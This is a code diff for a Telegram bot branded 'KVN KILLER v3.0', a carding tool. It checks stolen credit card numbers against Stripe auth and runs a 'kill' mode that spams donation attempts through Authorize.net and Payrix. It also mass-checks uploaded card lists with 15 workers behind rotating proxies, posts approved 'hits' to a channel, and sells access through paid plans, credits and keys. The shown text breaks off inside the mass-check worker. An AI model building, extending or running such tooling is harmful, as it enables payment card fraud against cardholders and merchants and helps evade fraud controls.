+    return "「 ✦ 」「 ✦ 」「 ✦ 」"
+
+def sep_short() -> str:
+    return "「 ✦ 」「 ✦ 」"
+
+def sep_mini() -> str:
+    return "「 ✦ 」"
+
+def loading_bar(percent: int, label: str) -> str:
+    filled = percent // 10
+    bar = "▰" * filled + "▱" * (10 - filled)
+    return f"⟦ {bar} ⟧ {percent}% — {label}"
+
+def box_title(text: str, width: int = 38) -> str:
+    line = "═" * width
+    return f"╔{line}╗\n║ <b>{text:^{width-5}}</b> ║\n╚{line}╝"
+
+def format_kill_result(card, mm, yy, cvv, result, bin_info, user_name, elapsed, credits_left):
+    ks = result.get('killer_status', 'Unknown')
+    if "KILLED" in ks:
+        status_emoji = "💀"
+        status_color = "𝗞𝗜𝗟𝗟𝗘𝗗"
+    elif "Live" in ks:
+        status_emoji = "⚡"
+        status_color = "𝗠𝗔𝗬𝗕𝗘 𝗟𝗜𝗩𝗘"
+    else:
+        status_emoji = "❌"
+        status_color = "𝗘𝗥𝗥𝗢𝗥"
+
+    return (
+        f"{box_title('⚡ KVN KILLER v3.0 ⚡')}\n\n"
+        f"💳 <code>{card}|{mm}|{yy}|{cvv}</code>\n"
+        f"{sep_short()}\n"
+        f"🏷 𝗕𝗿𝗮𝗻𝗱 ▸ <b>{bin_info.get('brand','Unknown').upper()}</b>\n"
+        f"🏦 𝗕𝗮𝗻𝗸  ▸ <b>{bin_info.get('bank','Unknown')}</b>\n"
+        f"🌍 𝗥𝗲𝗴𝗶𝗼𝗻 ▸ {bin_info.get('country_code','🌍')} <b>{bin_info.get('country','Unknown')}</b>\n"
+        f"💳 𝗧𝘆𝗽𝗲  ▸ <b>{bin_info.get('type','Unknown')}</b> / <b>{bin_info.get('sub_type','Unknown')}</b>\n"
+        f"{sep_mid()}\n"
+        f"{status_emoji} <b>{status_color}</b>\n"
+        f"🔗 𝗔𝘂𝘁𝗵 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ▸ <b>{result['response']}</b>\n"
+        f"{sep_mid()}\n"
+        f"⏱ 𝗘𝗹𝗮𝗽𝘀𝗲𝗱 ▸ <code>{elapsed}s</code>\n"
+        f"💰 𝗖𝗿𝗲𝗱𝗶𝘁𝘀   ▸ <code>{credits_left}</code>\n"
+        f"👤 𝗢𝗽𝗲𝗿𝗮𝘁𝗼𝗿 ▸ <b>{user_name}</b>\n"
+        f"{sep_mini()}"
+    )
+
+def format_check_result(card, mm, yy, cvv, result, bin_info, user_name, elapsed):
+    status = result["status"]
+    if status == "APPROVED":
+        emoji = "✅"
+        stext = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗"
+        accent = "💎"
+    elif status == "CHARGED":
+        emoji = "💎"
+        stext = "𝗖𝗛𝗔𝗥𝗚𝗘𝗗"
+        accent = "🔥"
+    elif status == "DECLINED":
+        emoji = "❌"
+        stext = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗"
+        accent = "💀"
+    else:
+        emoji = "⚠️"
+        stext = "𝗘𝗥𝗥𝗢𝗥"
+        accent = "⚠️"
+
+    decline_info = ""
+    if "decline_code" in result and result["decline_code"] != "unknown":
+        decline_info = f"🚫 𝗖𝗼𝗱𝗲    ▸ <code>{result['decline_code']}</code>\n"
+
+    return (
+        f"{box_title('⚡ STRIPE AUTH ⚡')}\n\n"
+        f"{accent} <b>{stext}</b> {emoji}\n"
+        f"{sep_mid()}\n"
+        f"💳 𝗖𝗮𝗿𝗱     ▸ <code>{card}|{mm}|{yy}|{cvv}</code>\n"
+        f"🔗 𝗚𝗮𝘁𝗲𝘄𝗮𝘆  ▸ <b>{result['gateway']}</b> <code>{result['amount']} USD</code>\n"
+        f"💬 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ▸ <b>{result['response']}</b>\n"
+        f"{decline_info}"
+        f"{sep_mid()}\n"
+        f"🏷 𝗕𝗿𝗮𝗻𝗱    ▸ <b>{bin_info.get('brand','Unknown').upper()}</b>\n"
+        f"🏦 𝗜𝘀𝘀𝘂𝗲𝗿   ▸ <b>{bin_info.get('bank','Unknown')}</b>\n"
+        f"🌍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆  ▸ {bin_info.get('country_code','🌍')} <b>{bin_info.get('country','Unknown')}</b>\n"
+        f"{sep_mid()}\n"
+        f"👽 𝗨𝘀𝗲𝗿     ▸ <b>{user_name}</b>\n"
+        f"⏱ 𝗧𝗶𝗺𝗲      ▸ <code>{elapsed}s</code>\n"
+        f"{sep_mini()}"
+    )
+
+def format_mass_progress(state: dict) -> str:
+    elapsed = int(time.time() - state["start_time"])
+    mins, secs = divmod(elapsed, 60)
+    current = state.get("current", "N/A")
+    last_resp = state.get("last_response", "N/A")
+    checked = state["checked"]
+    total = state["total"]
+    pct = round(checked / total * 100, 1) if total > 0 else 0
+    filled = int(pct // 10)
+    bar = "▰" * filled + "▱" * (10 - filled)
+    return (
+        f"{box_title('⚡ MASS STRIPE CHECK ⚡')}\n\n"
+        f"⟦ {bar} ⟧ <b>{pct}%</b>\n"
+        f"{sep_mid()}\n"
+        f"📦 𝗧𝗼𝘁𝗮𝗹     ▸ <b>{total}</b>\n"
+        f"⚙️ 𝗪𝗼𝗿𝗸𝗲𝗿𝘀   ▸ <b>{state['workers']}</b>\n"
+        f"👑 𝗣𝗹𝗮𝗻      ▸ <b>{state['plan']}</b>\n\n"
+        f"🔍 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 ▸ <code>{current}</code>\n"
+        f"💬 𝗟𝗮𝘀𝘁    ▸ <i>{last_resp}</i>\n"
+        f"{sep_mid()}\n"
+        f"✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ▸ <code>{state['approved']}</code>\n"
+        f"❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ▸ <code>{state['declined']}</code>\n"
+        f"📊 𝗖𝗵𝗲𝗰𝗸𝗲𝗱  ▸ <code>{checked}/{total}</code>\n"
+        f"{sep_mid()}\n"
+        f"⏱ 𝗘𝗹𝗮𝗽𝘀𝗲𝗱  ▸ <code>{mins}m {secs}s</code>\n"
+        f"{sep_mini()}"
+    )
+
+def format_mass_summary(state: dict) -> str:
+    elapsed = int(time.time() - state["start_time"])
+    mins, secs = divmod(elapsed, 60)
+    checked = state["checked"]
+    total = state["total"]
+    hits = state["approved"] + state["charged"]
+    rate = round(hits / checked * 100, 2) if checked > 0 else 0
+    speed = round(checked / elapsed, 1) if elapsed > 0 else 0
+    return (
+        f"{box_title('⚡ MASS CHECK COMPLETE ⚡')}\n\n"
+        f"📦 𝗧𝗼𝘁𝗮𝗹      ▸ <b>{total}</b>\n"
+        f"✅ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗲𝗱 ▸ <code>{checked}</code>\n"
+        f"{sep_mid()}\n"
+        f"💎 𝗛𝗶𝘁𝘀      ▸ <code>{hits}</code>\n"
+        f"✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱  ▸ <code>{state['approved']}</code>\n"
+        f"❌ 𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱  ▸ <code>{state['declined']}</code>\n"
+        f"{sep_mid()}\n"
+        f"📊 𝗛𝗶𝘁 𝗥𝗮𝘁𝗲  ▸ <b>{rate}%</b>\n"
+        f"⚡ 𝗦𝗽𝗲𝗲𝗱    ▸ <code>{speed} c/s</code>\n"
+        f"⏱ 𝗧𝗶𝗺𝗲      ▸ <code>{mins}m {secs}s</code>\n"
+        f"{sep_mini()}"
+    )
+
+def format_mass_hit(card, mm, yy, cvv, result, bin_info, elapsed, user_name):
+    return (
+        f"{box_title('✅ APPROVED ✅')}\n\n"
+        f"💳 𝗖𝗮𝗿𝗱    ▸ <code>{card}|{mm}|{yy}|{cvv}</code>\n"
+        f"🏦 𝗕𝗮𝗻𝗸    ▸ <b>{bin_info.get('bank','Unknown Bank')}</b>\n"
+        f"🏷 𝗕𝗿𝗮𝗻𝗱   ▸ <b>{bin_info.get('brand','UNKNOWN').upper()}</b> / <b>{bin_info.get('type','CREDIT').upper()}</b>\n"
+        f"🌍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ▸ {bin_info.get('country_code','🌍')} <b>{bin_info.get('country','Unknown')}</b>\n"
+        f"{sep_mid()}\n"
+        f"💬 𝗥𝗲𝘀𝗽   ▸ <b>{result['response']}</b>\n"
+        f"🔗 𝗚𝗮𝘁𝗲   ▸ <b>{result['gateway']}</b>\n"
+        f"⏱ 𝗧𝗶𝗺𝗲   ▸ <code>{elapsed}s</code>\n"
+        f"{sep_mid()}\n"
+        f"📡 𝗦𝗲𝗻𝘁 𝘁𝗼 𝗰𝗵𝗮𝗻𝗻𝗲𝗹\n"
+        f"👤 @{user_name}\n"
+        f"{sep_mini()}"
+    )
+
+def format_channel_hit(user_name, card_masked, result):
+    return (
+        f"{box_title('✅ HIT FOUND ✅')}\n\n"
+        f"👤 𝗨𝘀𝗲𝗿    ▸ <b>{user_name}</b>\n"
+        f"✅ 𝗦𝘁𝗮𝘁𝘂𝘀   ▸ <b>{result['status']}</b>\n"
+        f"💳 𝗖𝗮𝗿𝗱    ▸ <code>{card_masked}</code>\n"
+        f"💬 𝗥𝗲𝘀𝗽    ▸ <b>{result['response']}</b>\n"
+        f"🔗 𝗚𝗮𝘁𝗲    ▸ <b>{result['gateway']}</b>\n"
+        f"⚙️ 𝗖𝗠𝗗     ▸ <code>/mst</code>\n"
+        f"{sep_mini()}\n"
+        f"👤 @{user_name}"
+    )
+
+def format_plan(user_id: int) -> str:
+    user = user_db.get_user(user_id)
+    if not user:
+        return "❌ User not found."
+    expiry = user.get("plan_expiry")
+    days = 0
+    if expiry:
+        try:
+            dt = datetime.fromisoformat(expiry)
+            days = max(0, (dt - datetime.now()).days)
+        except: pass
+    active = "✅ Active" if days > 0 else "❌ Expired"
+    return (
+        f"{box_title('👑 PLAN INFO 👑')}\n\n"
+        f"📊 𝗦𝘁𝗮𝘁𝘂𝘀     ▸ <b>{active}</b>\n"
+        f"⏱️ 𝗘𝘅𝗽𝗶𝗿𝗲𝘀   ▸ <code>{expiry[:10] if expiry else 'N/A'}</code>\n"
+        f"📅 𝗗𝗮𝘆𝘀 𝗟𝗲𝗳𝘁 ▸ <b>{days}</b>\n"
+        f"{sep_mid()}\n"
+        f"💳 <code>/chk</code>  ▸ CC|MM|YY|CVV — Stripe Auth\n"
+        f"⚡ <code>/kill</code> ▸ CC|MM|YY|CVV — Card Killer\n"
+        f"{sep_mid()}\n"
+        f"💰 𝗖𝗿𝗲𝗱𝗶𝘁𝘀  ▸ <code>{user['kill_credits']}</code>\n"
+        f"🔍 𝗖𝗵𝗲𝗰𝗸𝘀   ▸ <code>{user['check_count']}</code>\n"
+        f"💀 𝗞𝗶𝗹𝗹𝘀    ▸ <code>{user['kill_count']}</code>\n"
+        f"{sep_mini()}"
+    )
+
+def format_menu(is_owner: bool = False) -> str:
+    base = (
+        f"{box_title('⚙️ KVN KILLER v3.0 ⚙️')}\n\n"
+        f"💳 <code>/chk</code>  ▸ CC|MM|YY|CVV — Stripe Auth\n"
+        f"⚡ <code>/kill</code> ▸ CC|MM|YY|CVV — Kill Card\n"
+        f"{sep_mid()}\n"
+        f"📁 <code>/mst</code>  ▸ Reply to .txt — Mass Check\n"
+        f"⏹️ <code>/stop</code> ▸ Stop Mass Check\n"
+        f"📊 <code>/mystats</code> ▸ Your Stats\n"
+        f"{sep_mid()}\n"
+        f"🔗 <code>/proxy</code>   ▸ Add Proxy\n"
+        f"🌐 <code>/proxies</code> ▸ View Proxies\n"
+        f"{sep_mid()}\n"
+        f"👑 <code>/plan</code>    ▸ Plan Info\n"
+        f"💰 <code>/credits</code> ▸ Credits Balance\n"
+        f"🔑 <code>/redeem</code>  ▸ Redeem Key\n"
+        f"{sep_mid()}\n"
+    )
+    if is_owner:
+        base += (
+            f"🛡️ <b>ADMIN</b>\n"
+            f"{sep_mini()}\n"
+            f"👤 <code>/grant ID DAYS</code> ▸ Grant Plan\n"
+            f"⚡ <code>/grantkiller ID CREDITS</code>\n"
+            f"🔑 <code>/keygen DAYS [count]</code>\n"
+            f"🚫 <code>/ban</code> / <code>/unban</code> / <code>/banlist</code>\n"
+            f"📢 <code>/broadcast</code> ▸ Mass Message\n"
+            f"📊 <code>/stats</code> ▸ Bot Stats\n"
+            f"🔄 <code>/reload</code> ▸ Reload Proxies\n"
+            f"{sep_mini()}"
+        )
+    return base
+
+# ═══════════════════════════════════════
+# INLINE KEYBOARDS
+# ═══════════════════════════════════════
+def menu_keyboard(is_owner: bool = False) -> InlineKeyboardMarkup:
+    buttons = [
+        [InlineKeyboardButton("💳 Stripe Check", callback_data="nav_chk"),
+         InlineKeyboardButton("⚡ Kill Card", callback_data="nav_kill")],
+        [InlineKeyboardButton("📁 Mass Check", callback_data="nav_mst"),
+         InlineKeyboardButton("📊 My Stats", callback_data="nav_mystats")],
+        [InlineKeyboardButton("👑 Plan", callback_data="nav_plan"),
+         InlineKeyboardButton("💰 Credits", callback_data="nav_credits")],
+        [InlineKeyboardButton("🌐 Proxies", callback_data="nav_proxies")],
+    ]
+    if is_owner:
+        buttons.append([InlineKeyboardButton("🛡️ Admin Panel", callback_data="nav_admin")])
+    return InlineKeyboardMarkup(buttons)
+
+def admin_keyboard() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats"),
+         InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
+        [InlineKeyboardButton("🔑 Key Gen", callback_data="admin_keygen"),
+         InlineKeyboardButton("🚫 Ban List", callback_data="admin_banlist")],
+        [InlineKeyboardButton("🔄 Reload Proxies", callback_data="admin_reload"),
+         InlineKeyboardButton("🌐 Proxy List", callback_data="admin_proxylist")],
+        [InlineKeyboardButton("⬅️ Back", callback_data="nav_menu")]
+    ])
+
+def back_keyboard() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("⬅️ Back to Menu", callback_data="nav_menu")]
+    ])
+
+# ═══════════════════════════════════════
+# MASS CHECK STATE
+# ═══════════════════════════════════════
+class MassCheckState:
+    def __init__(self, total: int, workers: int, plan: str):
+        self.total = total
+        self.workers = workers
+        self.plan = plan
+        self.msg = None
+        self.checked = 0
+        self.charged = 0
+        self.approved = 0
+        self.three_ds = 0
+        self.declined = 0
+        self.current = "N/A"
+        self.last_response = "N/A"
+        self.start_time = time.time()
+        self.lock = asyncio.Lock()
+        self.stopped = False
+        self.hits: List[Tuple] = []
+
+    def to_dict(self):
+        return {
+            "total": self.total, "workers": self.workers, "plan": self.plan,
+            "checked": self.checked, "charged": self.charged, "approved": self.approved,
+            "three_ds": self.three_ds, "declined": self.declined,
+            "current": self.current, "last_response": self.last_response,
+            "start_time": self.start_time
+        }
+
+# ═══════════════════════════════════════
+# HANDLERS
+# ═══════════════════════════════════════
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    u = update.effective_user
+    user_db.ensure_user(u.id, u.username or "", u.first_name or "")
+    is_owner = (u.id == OWNER_ID)
+    name = u.first_name or "Operator"
+    text = (
+        f"{box_title('⚡ KVN KILLER v3.0 ⚡')}\n\n"
+        f"👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲, <b>{name}</b>\n"
+        f"💀 𝗞𝗶𝗹𝗹𝗲𝗿 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 — Authorize.net + Payrix\n"
+        f"💎 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 — Single + Mass\n\n"
+        f"{format_menu(is_owner)}\n\n"
+        f"⚠️ Use responsibly. Knowledge is power."
+    )
+    await update.message.reply_text(text, parse_mode=ParseMode.HTML,
+                                   reply_markup=menu_keyboard(is_owner))
+
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    data = query.data
+    u = query.from_user
+    user_db.ensure_user(u.id, u.username or "", u.first_name or "")
+    is_owner = (u.id == OWNER_ID)
+
+    if data == "nav_menu":
+        await query.edit_message_text(
+            f"{box_title('⚡ KVN KILLER v3.0 ⚡')}\n\n{format_menu(is_owner)}",
+            parse_mode=ParseMode.HTML, reply_markup=menu_keyboard(is_owner))
+
+    elif data == "nav_chk":
+        await query.edit_message_text(
+            f"{box_title('💳 STRIPE CHECK 💳')}\n\n"
+            f"Usage:\n<code>/chk 4111111111111111|12|25|123</code>\n\n"
+            f"Or reply to a message containing the card with <code>/chk</code>",
+            parse_mode=ParseMode.HTML, reply_markup=back_keyboard())
+
+    elif data == "nav_kill":
+        await query.edit_message_text(
+            f"{box_title('⚡ KILL CARD ⚡')}\n\n"
+            f"Usage:\n<code>/kill 4111111111111111|12|25|123</code>\n\n"
+            f"Spams 5 donation attempts + Payrix check\n"
+            f"💀 Requires kill credits",
+            parse_mode=ParseMode.HTML, reply_markup=back_keyboard())
+
+    elif data == "nav_mst":
+        await query.edit_message_text(
+            f"{box_title('📁 MASS CHECK 📁')}\n\n"
+            f"1️⃣ Upload a <code>.txt</code> file\n"
+            f"2️⃣ Reply <code>/mst</code> to it\n"
+            f"3️⃣ Or just send the file directly\n\n"
+            f"⚡ 15 workers · Auto-hits to channel\n"
+            f"📊 Live progress bar\n"
+            f"⏹️ Use <code>/stop</code> to abort",
+            parse_mode=ParseMode.HTML, reply_markup=back_keyboard())
+
+    elif data == "nav_mystats":
+        user = user_db.get_user(u.id)
+        await query.edit_message_text(
+            f"{box_title('📊 YOUR STATS 📊')}\n\n"
+            f"🔍 𝗖𝗵𝗲𝗰𝗸𝘀   ▸ <code>{user['check_count']}</code>\n"
+            f"💀 𝗞𝗶𝗹𝗹𝘀    ▸ <code>{user['kill_count']}</code>\n"
+            f"💰 𝗖𝗿𝗲𝗱𝗶𝘁𝘀  ▸ <code>{user['kill_credits']}</code>\n"
+            f"👑 𝗣𝗹𝗮𝗻     ▸ <b>{'✅ Active' if user_db.has_active_plan(u.id) else '❌ Inactive'}</b>\n"
+            f"{sep_mini()}",
+            parse_mode=ParseMode.HTML, reply_markup=back_keyboard())
+
+    elif data == "nav_plan":
+        await query.edit_message_text(format_plan(u.id), parse_mode=ParseMode.HTML,
+                                     reply_markup=back_keyboard())
+
+    elif data == "nav_credits":
+        credits = user_db.get_credits(u.id)
+        await query.edit_message_text(
+            f"{box_title('💰 CREDITS 💰')}\n\n"
+            f"💰 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 ▸ <code>{credits}</code>\n"
+            f"{sep_mini()}",
+            parse_mode=ParseMode.HTML, reply_markup=back_keyboard())
+
+    elif data == "nav_proxies":
+        if not is_owner:
+            await query.edit_message_text("⛔ Owner only.", parse_mode=ParseMode.HTML,
+                                          reply_markup=back_keyboard())
+            return
+        active = proxy_rotator.count_active()
+        total = proxy_rotator.count_total()
+        await query.edit_message_text(
+            f"{box_title('🌐 PROXIES 🌐')}\n\n"
+            f"🟢 𝗔𝗰𝘁𝗶𝘃𝗲 ▸ <code>{active}</code>\n"
+            f"📦 𝗧𝗼𝘁𝗮𝗹  ▸ <code>{total}</code>\n\n"
+            f"Add: <code>/proxy ip:port</code>\n"
+            f"Add: <code>/proxy ip:port:user:pass</code>\n"
+            f"Del: <code>/delproxy INDEX</code>",
+            parse_mode=ParseMode.HTML, reply_markup=back_keyboard())
+
+    elif data == "nav_admin":
+        if not is_owner:
+            await query.edit_message_text("⛔ Owner only.", parse_mode=ParseMode.HTML,
+                                          reply_markup=back_keyboard())
+            return
+        await query.edit_message_text(
+            f"{box_title('🛡️ ADMIN PANEL 🛡️')}\n\n"
+            f"Select an action below:",
+            parse_mode=ParseMode.HTML, reply_markup=admin_keyboard())
+
+    elif data == "admin_stats":
+        s = user_db.get_stats()
+        active_u = user_db._exec("SELECT COUNT(*) FROM users WHERE is_banned = 0")[0][0]
+        banned_u = user_db._exec("SELECT COUNT(*) FROM users WHERE is_banned = 1")[0][0]
+        with_plan = user_db._exec("SELECT COUNT(*) FROM users WHERE plan_expiry IS NOT NULL AND plan_expiry > ?",
+                                   (datetime.now().isoformat(),))[0][0]
+        total_kills = user_db._exec("SELECT SUM(kill_count) FROM users")[0][0] or 0
+        total_credits = user_db._exec("SELECT SUM(kill_credits) FROM users")[0][0] or 0
+        pa = proxy_rotator.count_active()
+        pt = proxy_rotator.count_total()
+        await query.edit_message_text(
+            f"{box_title('📊 BOT STATS 📊')}\n\n"
+            f"👥 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀   ▸ <code>{s['users']}</code>\n"
+            f"✅ 𝗔𝗰𝘁𝗶𝘃𝗲         ▸ <code>{active_u}</code>\n"
+            f"🚫 𝗕𝗮𝗻𝗻𝗲𝗱       ▸ <code>{banned_u}</code>\n"
+            f"👑 𝗪𝗶𝘁𝗵 𝗣𝗹𝗮𝗻     ▸ <code>{with_plan}</code>\n"
+            f"{sep_mid()}\n"
+            f"🔍 𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗲𝗰𝗸𝘀  ▸ <code>{s['checks']}</code>\n"
+            f"💎 𝗟𝗶𝘃𝗲𝘀         ▸ <code>{s['lives']}</code>\n"
+            f"💀 𝗧𝗼𝘁𝗮𝗹 𝗞𝗶𝗹𝗹𝘀   ▸ <code>{total_kills}</code>\n"
+            f"💰 𝗖𝗿𝗲𝗱𝗶𝘁𝘀       ▸ <code>{total_credits}</code>\n"
+            f"{sep_mid()}\n"
+            f"🌐 𝗣𝗿𝗼𝘅𝗶𝗲𝘀       ▸ <code>{pa}/{pt}</code> active\n"
+            f"{sep_mini()}",
+            parse_mode=ParseMode.HTML, reply_markup=admin_keyboard())
+
+    elif data == "admin_reload":
+        if proxy_rotator.active:
+            proxy_rotator.coll.update_many({"fail_count": {"$lt": 5}},
+                                           {"$set": {"is_active": True}})
+            count = proxy_rotator.count_active()
+            await query.edit_message_text(
+                f"{box_title('🔄 RELOADED 🔄')}\n\n"
+                f"🌐 𝗔𝗰𝘁𝗶𝘃𝗲 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ▸ <code>{count}</code>\n"
+                f"{sep_mini()}",
+                parse_mode=ParseMode.HTML, reply_markup=admin_keyboard())
+        else:
+            await query.edit_message_text("❌ MongoDB not connected.",
+                                          parse_mode=ParseMode.HTML, reply_markup=admin_keyboard())
+
+    elif data == "admin_banlist":
+        rows = user_db._exec("SELECT user_id, username FROM users WHERE is_banned = 1")
+        if not rows:
+            msg = f"{box_title('🚫 BANLIST 🚫')}\n\nNo banned users.\n{sep_mini()}"
+        else:
+            msg = f"{box_title('🚫 BANLIST 🚫')}\n\n"
+            for r in rows:
+                msg += f"• <code>{r[0]}</code> — {r[1] or 'N/A'}\n"
+            msg += sep_mini()
+        await query.edit_message_text(msg, parse_mode=ParseMode.HTML,
+                                      reply_markup=admin_keyboard())
+
+    elif data == "admin_proxylist":
+        proxies = proxy_rotator.list_all()
+        if not proxies:
+            msg = "No proxies in database."
+        else:
+            msg = f"{box_title('🌐 PROXY LIST 🌐')}\n\n"
+            for idx, p in enumerate(proxies[:20]):
+                status = "🟢" if p.get("is_active") else "🔴"
+                msg += f"{idx}. <code>{p['proxy_string']}</code> {status} ({p.get('fail_count',0)})\n"
+            if len(proxies) > 20:
+                msg += f"... and {len(proxies)-20} more"
+            msg += sep_mini()
+        await query.edit_message_text(msg, parse_mode=ParseMode.HTML,
+                                     reply_markup=admin_keyboard())
+
+    elif data == "admin_broadcast":
+        await query.edit_message_text(
+            f"{box_title('📢 BROADCAST 📢')}\n\n"
+            f"Usage:\n<code>/broadcast Your message here</code>",
+            parse_mode=ParseMode.HTML, reply_markup=admin_keyboard())
+
+    elif data == "admin_keygen":
+        await query.edit_message_text(
+            f"{box_title('🔑 KEY GENERATOR 🔑')}\n\n"
+            f"Usage:\n<code>/keygen DAYS [count]</code>\n\n"
+            f"Example:\n<code>/keygen 30</code> — 1 key, 30 days\n"
+            f"<code>/keygen 7 5</code> — 5 keys, 7 days each",
+            parse_mode=ParseMode.HTML, reply_markup=admin_keyboard())
+
+async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    u = update.effective_user
+    user_db.ensure_user(u.id, u.username or "", u.first_name or "")
+    if user_db.is_banned(u.id):
+        await update.message.reply_text("⛔ You are banned.")
+        return
+    if not user_db.has_active_plan(u.id) and u.id != OWNER_ID:
+        await update.message.reply_text("⚠️ No active plan. Contact admin or redeem a key.")
+        return
+
+    text = " ".join(context.args) if context.args else ""
+    if not text and update.message.reply_to_message:
+        text = update.message.reply_to_message.text
+    parsed = parse_cc(text)
+    if not parsed:
+        await update.message.reply_text(
+            f"❌ Invalid format.\n\nUsage: <code>/chk 4111111111111111|12|25|123</code>",
+            parse_mode=ParseMode.HTML)
+        return
+    card, mm, yy, cvv = parsed
+
+    msg = await update.message.reply_text(
+        f"{box_title('⚡ STRIPE AUTH ⚡')}\n\n{loading_bar(10, 'Initializing...')}",
+        parse_mode=ParseMode.HTML)
+    start = time.time()
+    proxy = proxy_rotator.get_random()
+    purl = proxy["url"] if proxy else None
+
+    async with aiohttp.ClientSession() as session:
+        await msg.edit_text(
+            f"{box_title('⚡ STRIPE AUTH ⚡')}\n\n{loading_bar(30, 'BIN Lookup...')}",
+            parse_mode=ParseMode.HTML)
+        bin_info = await bin_lookup(card, session, purl)
+        await msg.edit_text(
+            f"{box_title('⚡ STRIPE AUTH ⚡')}\n\n{loading_bar(50, 'Stripe Gateway...')}",
+            parse_mode=ParseMode.HTML)
+        result = await StripeChecker.check(card, mm, yy, cvv, session, purl)
+
+    if proxy and result.get("status") == "ERROR":
+        proxy_rotator.mark_failed(proxy["url"])
+
+    elapsed = round(time.time() - start, 2)
+    user_db.increment_checks(u.id)
+    user_db.log_check(u.id, card, result["status"], "Stripe Auth")
+    await msg.edit_text(
+        format_check_result(card, mm, yy, cvv, result, bin_info, u.first_name or "User", elapsed),
+        parse_mode=ParseMode.HTML)
+
+async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    u = update.effective_user
+    user_db.ensure_user(u.id, u.username or "", u.first_name or "")
+    if user_db.is_banned(u.id):
+        await update.message.reply_text("⛔ You are banned.")
+        return
+    if u.id != OWNER_ID and not user_db.deduct_kill_credit(u.id):
+        await update.message.reply_text("⚠️ No kill credits left. Contact admin.")
+        return
+
+    text = " ".join(context.args) if context.args else ""
+    if not text and update.message.reply_to_message:
+        text = update.message.reply_to_message.text
+    parsed = parse_cc(text)
+    if not parsed:
+        await update.message.reply_text(
+            f"❌ Invalid format.\n\nUsage: <code>/kill 4111111111111111|12|25|123</code>",
+            parse_mode=ParseMode.HTML)
+        return
+    card, mm, yy, cvv = parsed
+    if card[:6] in BANNED_BINS:
+        await update.message.reply_text(f"⛔ BIN <code>{card[:6]}</code> is restricted.",
+                                        parse_mode=ParseMode.HTML)
+        return
+
+    loading = await update.message.reply_text(
+        f"{box_title('⚡ KVN KILLER ⚡')}\n\n{loading_bar(10, 'Initializing Sequence...')}",
+        parse_mode=ParseMode.HTML)
+    start = time.time()
+    proxy = proxy_rotator.get_random()
+    purl = proxy["url"] if proxy else None
+
+    await loading.edit_text(
+        f"{box_title('⚡ KVN KILLER ⚡')}\n\n{loading_bar(30, 'Engaging Target...')}",
+        parse_mode=ParseMode.HTML)
+
+    async with aiohttp.ClientSession() as session:
+        bin_info = await bin_lookup(card, session, purl)
+
+    await loading.edit_text(
+        f"{box_title('⚡ KVN KILLER ⚡')}\n\n{loading_bar(50, 'Spamming Gateways...')}",
+        parse_mode=ParseMode.HTML)
+    result = await KillerGateway.kill(card, mm, yy, cvv, purl)
+
+    elapsed = round(time.time() - start, 2)
+    user_db.log_check(u.id, card, result["status"], "Killer")
+    credits_left = "∞" if u.id == OWNER_ID else user_db.get_credits(u.id)
+
+    await loading.edit_text(
+        format_kill_result(card, mm, yy, cvv, result, bin_info, u.first_name or "User", elapsed, credits_left),
+        parse_mode=ParseMode.HTML)
+
+async def mst(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    u = update.effective_user
+    user_db.ensure_user(u.id, u.username or "", u.first_name or "")
+    if user_db.is_banned(u.id):
+        await update.message.reply_text("⛔ You are banned.")
+        return
+    if not user_db.has_active_plan(u.id) and u.id != OWNER_ID:
+        await update.message.reply_text("⚠️ No active plan.")
+        return
+
+    document = update.message.document
+    if not document and update.message.reply_to_message:
+        document = update.message.reply_to_message.document
+
+    if not document or not document.file_name.endswith(".txt"):
+        await update.message.reply_text(
+            f"Reply to a <code>.txt</code> file with <code>/mst</code>\n"
+            f"or send the file directly.",
+            parse_mode=ParseMode.HTML)
+        return
+
+    file = await document.get_file()
+    data = await file.download_as_bytearray()
+    text = data.decode("utf-8", errors="ignore")
+    lines = [l.strip() for l in text.splitlines() if l.strip()]
+    if not lines:
+        await update.message.reply_text("File is empty.")
+        return
+    if len(lines) > 5000:
+        await update.message.reply_text("⚠️ Max 5000 lines.")
+        return
+
+    plan = "ADMIN" if u.id == OWNER_ID else "USER"
+    workers = 15
+    state = MassCheckState(len(lines), workers, plan)
+    mass_stop_events[u.id] = state
+
+    progress_msg = await update.message.reply_text(
+        format_mass_progress(state.to_dict()), parse_mode=ParseMode.HTML)
+    state.msg = progress_msg
+
+    semaphore = asyncio.Semaphore(workers)
+
+    async def worker(line: str):
+        if state.stopped:
+            return
+        async with semaphore:
+            parsed = parse_cc(line)
+            if not parsed:
+                async with state.lock:
+                    state.checked += 1
+                    state.declined += 1
+                    state.last_response = "Invalid format"
+                return
+            card, mm, yy, cvv = parsed
+            masked = f"{card[:6]}******{card[-4:]}|{mm}|{yy}|***"
+            async with state.lock:
+                state.current = masked
+
+            proxy = proxy_rotator.get_random()
+            purl = proxy["url"] if proxy else None
